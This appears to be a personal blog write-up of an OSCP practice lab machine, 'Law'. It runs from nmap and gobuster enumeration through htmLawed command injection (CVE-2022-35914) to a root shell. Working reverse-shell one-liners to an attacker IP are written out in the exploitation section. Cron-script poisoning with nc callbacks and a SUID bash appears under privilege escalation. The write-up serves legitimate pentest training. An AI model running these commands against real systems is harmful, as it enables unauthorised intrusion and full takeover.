@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>OSCP - Law - Linux :: Digital Garden</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Law This one was another absolute slog. Identifying exploits for htmLawed v1.2.5 was very straightforward, and I got a little excited when I saw an RCE exploit had been found this year (2024).
+Running the exploit didn&rsquo;t work though, so I started researching the vulnerability further while trying to avoid the walkthroughs. I found the Mayfly article on the CVE which added a lot of extra context, and checking the walkthrough helped me realise why the Burpsuite request wasn&rsquo;t working properly (the request was to a non-existent page, and needed to be changed to /).
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/oscp---law---linux/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+<link rel="stylesheet" href="/terminal.css">
+
+
+
+
+<link rel="shortcut icon" href="/favicon.png">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="OSCP - Law - Linux">
+<meta property="og:description" content="Law This one was another absolute slog. Identifying exploits for htmLawed v1.2.5 was very straightforward, and I got a little excited when I saw an RCE exploit had been found this year (2024).
+Running the exploit didn&rsquo;t work though, so I started researching the vulnerability further while trying to avoid the walkthroughs. I found the Mayfly article on the CVE which added a lot of extra context, and checking the walkthrough helped me realise why the Burpsuite request wasn&rsquo;t working properly (the request was to a non-existent page, and needed to be changed to /).
+" />
+<meta property="og:url" content="/posts/oscp---law---linux/" />
+<meta property="og:site_name" content="Digital Garden" />
+
+  <meta property="og:image" content="/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Digital Garden
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+        
+          <li><a href="/showcase" >Showcase</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/oscp---law---linux/">OSCP - Law - Linux</a>
+  </h1>
+  <div class="post-meta"></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="law">Law<a href="#law" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>This one was another absolute slog. Identifying exploits for htmLawed v1.2.5 was very straightforward, and I got a little excited when I saw an RCE exploit had been found this year (2024).</p>
+<p>Running the exploit didn&rsquo;t work though, so I started researching the vulnerability further while trying to avoid the walkthroughs. I found the <a href="https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/">Mayfly article on the CVE</a> which added a lot of extra context, and checking the walkthrough helped me realise why the Burpsuite request wasn&rsquo;t working properly (the request was to a non-existent page, and needed to be changed to <code>/</code>).</p>
+<p>Even with that though, it still look a remarkably long time to get the reverse shell setup - running BurpSuite <code>intercept</code> and modifying the request <em>BEFORE</em> it went to the target was the trick, rather than trying to use <code>repeater</code> to modify requests already sent.</p>
+<p>With a dumb shell established, it was a surprise to lose it the moment I tried to use python to upgrade to a bash shell - going forward I might run <code>/usr/bin/script -qc /bin/bash /dev/null</code> first as it&rsquo;s more likely to give me the shell I&rsquo;m after without breaking things.</p>
+<p>PrivEsc turned out to be easier and more complicated than expected. Easier in that the <code>cleanup.sh</code> script was identified as interesting early on, but harder than expected when it came to testing the shell to see who was running it, and then how to modify it further when it came to switching to root - all of which I leaned on the walkthrough for. Adding the <code>curl</code> command was one step, but using <code>nc</code> to send the <code>id</code> to the listening port was very cool and clever. Changing the bash permissions was genius too, so definitely need to keep that set of commands handy for the next time there&rsquo;s a user script being run regularly by <code>root</code>.</p>
+<h1 id="resolution-summary">Resolution summary<a href="#resolution-summary" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li>Ran Nmap to identify ports <code>22</code> &amp; <code>80</code></li>
+<li>Visited http (<code>80</code>) &amp; identified htmLawed v1.2.5</li>
+<li>Researched vulnerability and attempted manual exploit</li>
+<li>Used Burpsuite to fix error with request and achieved reverse shell</li>
+<li>Identified script owned by <code>www-data</code> user but being regularly run by <code>root</code></li>
+<li>Added command to change permissions to <code>/bin/bash</code></li>
+<li>Used <code>bash -p</code> to switch to <code>root</code></li>
+</ul>
+<h2 id="improved-skills">Improved skills<a href="#improved-skills" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Burpsuite forwarding and request modification</li>
+<li>Identifying user scripts being regularly run by <code>root</code></li>
+</ul>
+<h2 id="used-tools">Used tools<a href="#used-tools" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>nmap</li>
+<li>gobuster</li>
+<li>burpsuite</li>
+<li>python3</li>
+</ul>
+<hr>
+<h1 id="information-gathering">Information Gathering<a href="#information-gathering" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>Scanned all TCP ports:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -sC -sV -oN Law.nmap 192.168.201.190 -v
+</span></span></code></pre></div><p>Enumerated open TCP ports:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.56 <span class="o">((</span>Debian<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.56 <span class="o">(</span>Debian<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: htmLawed <span class="o">(</span>1.2.5<span class="o">)</span> <span class="nb">test</span>
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><hr>
+<h1 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="port-22---ssh-openssh-79p1">Port 22 - SSH (OpenSSH 7.9p1)<a href="#port-22---ssh-openssh-79p1" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>No enumeration conducted</p>
+<h2 id="port-80---http-apache">Port 80 - HTTP (Apache)<a href="#port-80---http-apache" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Navigated to <code>http://192.168.201.190:80</code> and identified <code>htmLawed v1.2.5</code>
+<img src="/images/OSCP%20-%20Law%20-%20Linux%20-%20image1.png" alt="OSCP Law Linux Image1">
+<ul>
+<li><code>htmLawed v1.2.5</code> is vulnerable to command injection <a href="https://nvd.nist.gov/vuln/detail/cve-2022-35914">CVE-202-35914</a></li>
+</ul>
+</li>
+<li>Ran <code>gobuster dir -u http://192.168.201.190 -w /usr/share/dirb/wordlists/big.txt</code> to identify any web directories
+<img src="/images/OSCP%20-%20Law%20-%20Linux%20-%20image2.png" alt="OSCP Law Linux Image2"></li>
+<li>Ran <code>gobuster dir -u http://192.168.201.190 -w /usr/share/dirb/wordlists/big.txt -x php,html,htm,txt</code> to identify any files
+<img src="/images/OSCP%20-%20Law%20-%20Linux%20-%20image3.png" alt="OSCP Law Linux Image3"></li>
+</ul>
+<hr>
+<h1 id="exploitation">Exploitation<a href="#exploitation" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="command-injection">Command Injection<a href="#command-injection" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Found potential exploit <code>52023</code> on <a href="https://www.exploit-db.com/exploits/52023">ExploitDB</a></li>
+<li>Copied exploit and ran <code>./52023.sh -u http://192.168.201.190 -c id</code> for no output
+<img src="/images/OSCP%20-%20Law%20-%20Linux%20-%20image4.png" alt="OSCP Law Linux Image4"></li>
+<li><a href="https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/">Further investigated vulnerability</a> and found it might be executed from the target website by changing <code>hook</code> in settings to <code>exec</code> with <code>id</code> to test command execution
+<img src="/images/OSCP%20-%20Law%20-%20Linux%20-%20image5.png" alt="OSCP Law Linux Image5"></li>
+<li>Processed request and recieved <code>404 Not Found</code>
+<img src="/images/OSCP%20-%20Law%20-%20Linux%20-%20image6.png" alt="OSCP Law Linux Image6"></li>
+<li>Checked <code>BurpSuite</code> proxy history and found request was going to <code>htmLawedTest.php</code>.
+<img src="/images/OSCP%20-%20Law%20-%20Linux%20-%20image7.png" alt="OSCP Law Linux Image7"></li>
+<li>Sent request to <code>repeater</code> and modified POST request from <code>/htmLawedTest.php</code> to <code>/</code> then resent request with <code>id</code> and hook set to <code>exec</code>
+<img src="/images/OSCP%20-%20Law%20-%20Linux%20-%20image8.png" alt="OSCP Law Linux Image8"></li>
+<li>Ran <code>nc -nvlp 4444</code> to setup Netcat listener, then replaced <code>id</code> with <code>/bin/sh -i &gt;&amp; /dev/tcp/192.168.45.215/4444 0&gt;&amp;1</code> to attempt reverse shell
+<img src="/images/OSCP%20-%20Law%20-%20Linux%20-%20image9.png" alt="OSCP Law Linux Image9"></li>
+<li>Reattempted with <code>nc 192.168.45.215 4444 -e /bin/sh</code> and successfully caught reverse shell for initial access
+<img src="/images/OSCP%20-%20Law%20-%20Linux%20-%20image10.png" alt="OSCP Law Linux Image10"></li>
+</ul>
+<hr>
+<h1 id="lateral-movement-to-user">Lateral Movement to user<a href="#lateral-movement-to-user" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="local-enumeration">Local Enumeration<a href="#local-enumeration" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Attempted to use <code>python3</code> to upgrade shell but broke reverse shell and had to restart netcat listener
+<img src="/images/OSCP%20-%20Law%20-%20Linux%20-%20image11.png" alt="OSCP Law Linux Image11"></li>
+<li>Repeated earlier steps to restablish initial access, then checked for python to find it&rsquo;s not installed. Ran <code>/usr/bin/script -qc /bin/bash /dev/null</code> instead to achieve full shell, then navigated to home directory of <code>www-data</code> user to print <code>local.txt</code>
+<img src="/images/OSCP%20-%20Law%20-%20Linux%20-%20image12.png" alt="OSCP Law Linux Image12"></li>
+<li>Ran <code>find / -perm -u=s -type f 2&gt;/dev/null -printf &quot;%f\n&quot;</code> to find binaries with potential SUID bit set
+<img src="/images/OSCP%20-%20Law%20-%20Linux%20-%20image13.png" alt="OSCP Law Linux Image13"></li>
+</ul>
+<hr>
+<h1 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="local-enumeration-1">Local Enumeration<a href="#local-enumeration-1" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Ran <code>cat /etc/passwd</code> to identify any other users
+<img src="/images/OSCP%20-%20Law%20-%20Linux%20-%20image14.png" alt="OSCP Law Linux Image14"></li>
+<li>Uploaded and ran <code>suider.sh</code> to find potential SUID exploits
+<img src="/images/OSCP%20-%20Law%20-%20Linux%20-%20image15.png" alt="OSCP Law Linux Image15"></li>
+<li>Uploaded and ran <code>linpeas.sh</code> to find potential Privilege Escalations
+<img src="/images/OSCP%20-%20Law%20-%20Linux%20-%20image16.png" alt="OSCP Law Linux Image16"></li>
+<li>Found <code>cleanup.sh</code> in <code>www-data</code> home directory
+<img src="/images/OSCP%20-%20Law%20-%20Linux%20-%20image17.png" alt="OSCP Law Linux Image17"></li>
+<li>Ran <code>cat /var/www/cleanup.sh</code> to view <code>cleanup.sh</code>
+<img src="/images/OSCP%20-%20Law%20-%20Linux%20-%20image18.png" alt="OSCP Law Linux Image18"></li>
+</ul>
+<h2 id="privilege-escalation-vector">Privilege Escalation vector<a href="#privilege-escalation-vector" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Ran <code>nc -nvlp 8081</code> to setup netcat listener on 8081, then ran <code>echo 'id | nc 192.168.45.215 8081' &gt;&gt; cleanup.sh</code> to identify <code>cleanup.sh</code> is being regularly executed by <code>root</code>
+<img src="/images/OSCP%20-%20Law%20-%20Linux%20-%20image19.png" alt="OSCP Law Linux Image19"></li>
+<li>Ran <code>echo &quot;chmod +s /bin/bash&quot; &gt;&gt; cleanup.sh</code> to use <code>root</code> to change <code>/bin/bash</code> permissions, and ran <code>bash -p</code> until <code>cleanup.sh</code> was executed by <code>root</code> and user switched to <code>root</code>
+<img src="/images/OSCP%20-%20Law%20-%20Linux%20-%20image20.png" alt="OSCP Law Linux Image20"></li>
+<li>Ran <code>cat /root/proof.txt</code> to print <code>proof.txt</code> flag
+<img src="/images/OSCP%20-%20Law%20-%20Linux%20-%20image21.png" alt="OSCP Law Linux Image21"></li>
+</ul>
+<hr>
+<h1 id="trophy--loot">Trophy &amp; Loot<a href="#trophy--loot" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p><code>local.txt</code> = <code>e4dc76bd63849b739fd9741f9bda6995</code>
+<code>root.txt</code> = <code>b9d98ca2768e55aba770c7fb1f730323</code></p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="/posts/oscp---lavita---linux/" class="button inline prev">
+        &lt; [<span class="button__text">OSCP - LaVita - Linux</span>]
+      </a>
+    
+    
+      ::
+    
+    
+      <a href="/posts/oscp---levram---linux/" class="button inline next">
+         [<span class="button__text">OSCP - Levram - Linux</span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
